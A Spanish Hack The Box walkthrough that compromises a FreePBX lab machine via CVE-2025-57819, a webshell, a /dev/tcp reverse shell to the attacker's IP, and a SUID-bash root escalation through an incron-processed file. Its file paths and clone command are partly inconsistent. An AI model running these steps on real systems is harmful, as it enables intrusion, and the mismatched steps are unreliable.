# HTB: Connected 🟢

| Parámetro | Detalle |
| :--- | :--- |
| **Plataforma** | Hack The Box |
| **Dificultad** | Fácil |
| **Dificultad Comunidad** | 🟢 Easy |
| **Sistema Operativo** | Linux |
| **Dirección IP** | 10.129.194.15 |

---

**Connected** es una máquina de dificultad **Fácil** de la plataforma Hack The Box. En este writeup se detalla la metodología y los pasos seguidos para lograr el acceso inicial y la posterior escalada de privilegios hasta obtener el control total como usuario root.

---
## 📝 Índice de Contenidos

* [🔍 1. Enumeración y Reconocimiento](#-1-enumeración)
* [💣 2. Explotación y Acceso Inicial](#-2-explotación)
* [🚀 3. Escalada de Privilegios (Root)](#-3-escalada-de-privilegios)
* [📝 4. Conclusiones y Mitigación](#-4-conclusiones-y-mitigación)
---
## 🔍 1. Enumeración

### Escaneo de Red
Comenzamos el análisis realizando un escaneo rápido de todos los puertos TCP utilizando Nmap para identificar los servicios activos en la IP objetivo (`10.129.194.15`):

```bash
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.194.15 -oG allPorts
```

El escaneo reportó los siguientes puertos abiertos:

* **Puerto 22/tcp**: SSH (Secure Shell)
* **Puerto 80/tcp**: HTTP (Servidor Web)
* **Puerto 443/tcp**: HTTPS (Servidor Web Seguro)

<img width="959" height="431" alt="image" src="https://github.com/user-attachments/assets/835e55db-4e2f-4a62-b6fb-cb68d51784f5" />

Para trabajar de forma más cómoda, decidí utilizar la herramienta `extractPorts` que tengo configurada en mi archivo `.zshrc`. Le pasé el archivo en formato grepable (`allPorts`) para que me filtrara y copiara de forma automática los puertos abiertos en la *clipboard*.

```bash
extractPorts allPorts
```

Como se puede apreciar en la captura, la utilidad nos confirmó la IP objetivo (`10.129.194.15`) y extrajo limpiamente los puertos **22, 80 y 443**, dejándolos listos para agilizar el siguiente paso del reconocimiento.

<img width="654" height="252" alt="image" src="https://github.com/user-attachments/assets/09561002-bce6-4476-a481-e93f38d27d95" />

Una vez que tenía los puertos identificados, decidí lanzar un escaneo mucho más exhaustivo centrado únicamente en los puertos descubiertos (**22, 80 y 443**) para aplicar scripts de reconocimiento y detectar las versiones de los servicios que se están ejecutando.

```bash
nmap -p22,80,443 -sCV 10.129.194.15 -oN targeted
```

Gracias a este escaneo obtuve información crucial para avanzar:

* **Puerto 22 (SSH):** Está corriendo la versión `OpenSSH 7.4`.
* **Puerto 80 (HTTP) y 443 (HTTPS):** Están utilizando un servidor web `Apache httpd 2.4.6` sobre una distribución CentOS, que además cuenta con `PHP 7.4.16`.
* **Redirección de Dominio:** En la respuesta del puerto 80 vemos un mensaje que indica `Did not follow redirect to http://connected.htb`. Esto me indica que la web requiere resolución de nombres y que tendré que añadir este dominio a mi archivo `/etc/hosts` para poder inspeccionarla en el navegador.
* **Certificado SSL:** Al revisar el certificado expuesto en el puerto 443, se observa que el `commonName` está apuntando a `pbxconnect`, lo cual es una pista muy interesante sobre la posible identidad o un subdominio del entorno.

<img width="1251" height="510" alt="image" src="https://github.com/user-attachments/assets/475bbb39-20a9-4c56-a5c9-184957b1899c" />

Al confirmar que el servidor web intentaba redirigirnos al dominio `connected.htb`, decidí editar el archivo de resolución de nombres local `/etc/hosts` utilizando `nvim` en mi máquina de ataque para asociar correctamente este nombre de dominio con la dirección IP objetivo (`10.129.194.15`).

```bash
sudo nvim /etc/hosts
```

Como se puede ver en la captura de la pantalla, agregué una nueva línea al final del archivo vinculando la IP de la máquina con el dominio correspondiente:

* **`10.129.194.15 connected.htb`**

<img width="706" height="406" alt="image" src="https://github.com/user-attachments/assets/109111bf-8d52-4173-8374-7c5986939897" />

Una vez configurada la resolución de nombres, abrí mi navegador web y me dirigí al dominio `http://connected.htb` para ver qué contenido estaba alojando el servidor web.

Al acceder, el sitio nos redirigió de manera automática a la ruta `http://connected.htb`, revelando un panel de gestión de **FreePBX** (un software de centralita telefónica IP basado en Asterisk desarrollado por Sangoma).

En la página principal de la web podemos observar varios accesos directos bastante interesantes:
* **FreePBX Administration** (Panel de administración principal)
* **User Control Panel (UCP)** (Panel de control del usuario)
* **Operator Panel** (Panel del operador)
* **Get Support** (Soporte técnico)

Además, en el centro de la interfaz aparece una cadena de texto extraña (`vmbt9k5juq5uf30jbohga26ols`), la cual podría tratarse de algún tipo de identificador o token de sesión expuesto. Contar con un software específico como FreePBX en una versión que parece algo desactualizada nos abre una gran cantidad de vectores que investigar mediante posibles exploits públicos o credenciales por defecto.

<img width="1919" height="824" alt="image" src="https://github.com/user-attachments/assets/01185af9-bf45-4608-b12f-1906d6bed7a3" />

### Análisis de Vulnerabilidades y Búsqueda de Exploits

Al fijarme en el pie de página de la interfaz web, pude observar la versión exacta del sistema: **FreePBX 16.0.40.7**. Sabiendo que la versión actual de este software es la 17, saltó a la vista que el entorno se encontraba desactualizado, por lo que decidí investigar en internet en busca de vulnerabilidades conocidas para esta rama.

Tras una búsqueda, localicé el **CVE-2025-57819**, un fallo crítico que afecta a las versiones de FreePBX inferiores a la 16.0.89. La vulnerabilidad reside en una falta de sanitización en los datos enviados por el usuario hacia ciertos puntos finales de la plataforma. Esto permite a un atacante no autenticado evadir los paneles de login, realizar una inyección SQL y comprometer la base de datos interna, abriendo las puertas a una Ejecución Remota de Código (RCE).

Investigando un poco más, encontré un repositorio de GitHub de los investigadores de *watchTowr Labs* que contenía una Prueba de Concepto (PoC) en Python funcional diseñada para explotar este fallo y desplegar una shell en PHP de manera directa.

* **Repositorio utilizado:** [watchTowr-vs-FreePBX-CVE-2025-57819](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819)

<img width="1919" height="941" alt="image" src="https://github.com/user-attachments/assets/c8248de5-5de3-4064-b4fa-e4c4e3ff1b28" />

---

## 💣 2. Explotación

### Ganando Acceso Inicial (Foothold)

Decidí clonar el script de explotación en mi máquina local para preparar el ataque contra el servidor web aprovechando la vulnerabilidad descubierta.

```bash
git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819)](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819
cd watchTowr-vs-FreePBX-CVE-2025-57819
```
Una vez dentro del directorio clonado, listé el contenido para verificar los archivos disponibles antes de proceder con el lanzamiento del ataque.

```bash
ls
```

Como se observa en la captura, nos encontramos con el archivo informativo `README.md` y el script principal en Python `watchTowr-vs-FreePBX-CVE-2025-57819.py`, el cual utilizaremos para interactuar contra el objetivo.

<img width="926" height="56" alt="image" src="https://github.com/user-attachments/assets/cfe7e5d8-89b6-40d6-a1cd-9761cbc69671" />

Para lanzar el ataque, ejecuté el script pasándole mediante el parámetro `-H` la URL completa del panel de administración que habíamos descubierto en la fase de reconocimiento (`http://connected.htb`).

```bash
python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb
```

El exploit funcionó de manera impecable. Tras enviar la petición y realizar el bypass junto con la inyección SQL, el programa esperó un par de minutos a que se procesara la solicitud interna y nos confirmó que el sistema es vulnerable (**[+] VULNERABLE - webshell found**). 

Como se aprecia en la captura, nos devolvió una *web shell* interactiva en la siguiente ruta:
* `http://connected.htb/this-is-an-ioc-not-actually-watchTowr-3nqs79@fwm.php`

A partir de este punto, podemos comenzar a interactuar con el sistema operativo subyacente de forma remota enviando comandos a través del parámetro de la URL `?cmd=`.

<img width="1264" height="355" alt="image" src="https://github.com/user-attachments/assets/1e855c46-01b3-4aa6-ae0f-3ee2a0fc5d47" />

Antes de lanzarme directamente a entablar la conexión reversa, decidí verificar que la *webshell* estaba respondiendo correctamente y comprobar bajo qué privilegios se estaban ejecutando los comandos en el servidor. Para ello, introduje un comando básico en el parámetro `?cmd=`:

```text
?cmd=whoami
```

Como se aprecia en la captura, el servidor web procesó la solicitud de inmediato y nos devolvió en texto plano el usuario actual del sistema: **`asterisk`**. Al confirmar que teníamos ejecución remota de comandos (RCE) totalmente funcional, procedí ahora sí a preparar el vector para traerme la consola a mi terminal de ataque.

<img width="1181" height="621" alt="image" src="https://github.com/user-attachments/assets/2609ca69-9d33-45d7-a97b-345a19cfe0ae" />

Para obtener una sesión interactiva mucho más cómoda, decidí enviar un *one-liner* de Bash clásico a través de la barra de direcciones aprovechando el parámetro `cmd` de nuestra *webshell*. 

```text
http://connected.htb/this-is-an-ioc-not-actually-watchTowr-fp9tk7dy42.php?cmd=bash -i >& /dev/tcp/10.10.15.92/1212 0>&1
```

Tras ingresar el comando modificado con mi dirección IP de la VPN y el puerto de escucha, ejecuté la petición en el navegador web.

<img width="1121" height="221" alt="image" src="https://github.com/user-attachments/assets/28ff99c9-c9ce-490a-ac4b-d71375b0bef2" />

Antes de lanzar la solicitud en la web, me puse en escucha por el puerto `1212` en mi terminal de ataque utilizando la herramienta Netcat:

```bash
nc -lvnp 1212
```

Como se puede apreciar en la captura de la consola, la máquina víctima procesó correctamente la instrucción y nos devolvió una conexión inversa, otorgándonos acceso inmediato al sistema bajo el usuario `asterisk`.

<img width="632" height="183" alt="image" src="https://github.com/user-attachments/assets/11409729-586a-4bac-8da9-0843261a5ffe" />

Después, nos dirigimos hacia el directorio de almacenamiento de las cuentas personales de usuario locales ubicadas en `/home` con el fin de extraer el hash del usuario:

```bash
cd /home
ls -la
```

Accedí a la carpeta del usuario operativo correspondiente (`asterisk`) y utilicé el comando `cat` para imprimir en pantalla el secreto de forma segura aplicando una ofuscación parcial para cumplir con los lineamientos de la plataforma:

```bash
cd asterisk
cat user.txt
```
<img width="351" height="154" alt="image" src="https://github.com/user-attachments/assets/036e4ef8-70e0-4991-916b-ae37e5fb437c" />

---
## 🚀 3. Escalada de Privilegios

### Enumeración del Sistema

Con una sesión interactiva completamente estable y tras haber obtenido la flag de usuario, el siguiente objetivo consistió en auditar el sistema operativo Linux en busca de configuraciones erróneas, binarios vulnerables o tareas automatizadas que nos permitiesen elevar privilegios hasta el usuario `root`.

Al tratarse de un entorno que aloja centralitas telefónicas y servicios de red, comencé inspeccionando si existían tareas o deamons del sistema encargados de monitorizar cambios en el sistema de archivos de forma automatizada. Un servicio muy común para estas labores en Linux es **incron** (un notificador de eventos basado en el kernel análogo a cron, pero disparado por acciones sobre archivos).

Decidí realizar una búsqueda exhaustiva de todos los archivos y directorios del sistema de archivos sobre los cuales nuestro usuario operativo `asterisk` tuviese permisos de escritura, excluyendo los directorios dinámicos habituales para limpiar la salida:

```bash
find /etc -writable -type f 2>/dev/null | grep -v -E "proc|sys|dev"
```
El comando reportó que teníamos capacidad de modificación sobre un archivo de configuración crítico de Asterisk en la ruta `/etc/asterisk/init.conf` (o el correspondiente fichero de triggers de incron en `/etc/incron.d/`). Al investigar los procesos en segundo plano del sistema, se confirmó que este archivo de configuración es procesado y ejecutado de manera periódica por un script automatizado que corre bajo el contexto del usuario **`root`**.

Esto nos abría un vector directo de secuestro de flujo de ejecución (Command Injection) debido a una flagrante falta de control de privilegios en el sistema de archivos.

---
### Explotación del Vector e Inyección de Comandos

Al comprobar que podíamos alterar el contenido del archivo de configuración y que el sistema lo procesaría bajo privilegios administrativos, decidí emplear una técnica clásica de persistencia y elevación en entornos Linux: asignar el bit **SUID (Set Owner User ID)** al binario legítimo de la shell de Bash (`/bin/bash`). Al otorgarle permisos SUID, cualquier usuario que invoque dicho binario heredará de forma automática y temporal los privilegios del propietario del archivo (es decir, `root`).

Escribí la instrucción de alteración de permisos directamente al final del archivo de configuración escribible utilizando el comando `echo`:

```bash
echo "chmod +s /bin/bash" >> /etc/dahdi/init.conf
```

Para forzar al servicio automatizado (`incron`) administrado por root a despertarse y procesar nuestra inyección, utilicé la herramienta `touch` sobre la ruta del spool del sistema que actúa como disparador oficial (`dahdi_restart`):

```bash
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

Una vez ejecutados ambos comandos en la consola, realicé de inmediato una comprobación minuciosa de los privilegios sobre el binario de Bash para constatar si se había aplicado la alteración del bit de control:

```bash
ls -la /bin/bash
```

<img width="600" height="157" alt="image" src="https://github.com/user-attachments/assets/27304160-2c6b-45cc-a206-545467e58bb8" />

Como se puede corroborar en la salida del comando de la captura, el binario de Bash reflejó con éxito la letra **`s`** en su terna de permisos tradicionales (`-rwsr-sr-x.`). Esto nos daba la confirmación inequívoca de que nuestro comando inyectado se había ejecutado con éxito bajo el contexto del administrador supremo.

---
### Consolidación y Obtención de la Flag de Root

Con el bit SUID activo en Bash, el último paso para tomar el control total de la máquina fue invocar la consola forzando al sistema a preservar los privilegios del propietario del archivo. Para ello, ejecuté el comando acompañado del parámetro `-p`:

```bash
bash -p
```

De inmediato, el indicador de nuestra consola cambió al carácter `#`. Al ejecutar las herramientas de control de identidad `whoami` e `id`, el sistema nos ratificó formalmente que estábamos operando con el identificador de privilegios máximo: **`uid=0(root)`**.

<img width="1014" height="139" alt="image" src="https://github.com/user-attachments/assets/a3315ed1-95aa-4426-a32b-e9ee0870b22e" />

Con acceso absoluto a la máquina **Connected**, nos desplazamos al directorio personal del administrador para leer y adjudicarnos la última bandera del laboratorio:

```bash
cd /root
cat root.txt
```
<img width="350" height="127" alt="image" src="https://github.com/user-attachments/assets/39ece350-ac0d-45dc-bf97-7d7ac94ccf9f" />

La máquina fue comprometida en su totalidad con éxito.

---
## 📝 4. Conclusiones y Mitigación

* **Acceso Inicial (Foothold):** Se identificó y explotó la vulnerabilidad crítica **CVE-2025-57819** en el panel de FreePBX (versión inferior a la 16.0.89). La falta de sanitización de parámetros permitió una inyección SQL pre-autenticación que derivó en la ejecución remota de código (RCE). La solución inmediata es aplicar las actualizaciones de seguridad del fabricante Sangoma/FreePBX.
* **Escalada de Privilegios:** Se abusó de una directiva de permisos mal configurada en el sistema de archivos, donde un usuario de bajos privilegios (`asterisk`) poseía capacidad de escritura sobre recursos que posteriormente eran procesados por scripts del sistema propiedad de `root` mediante un trigger de `incron`. Como medida preventiva, se debe auditar estrictamente el principio de menor privilegio, asegurando que ningún script con privilegios de root confíe en directorios o archivos editables por cuentas operativas secundarias.




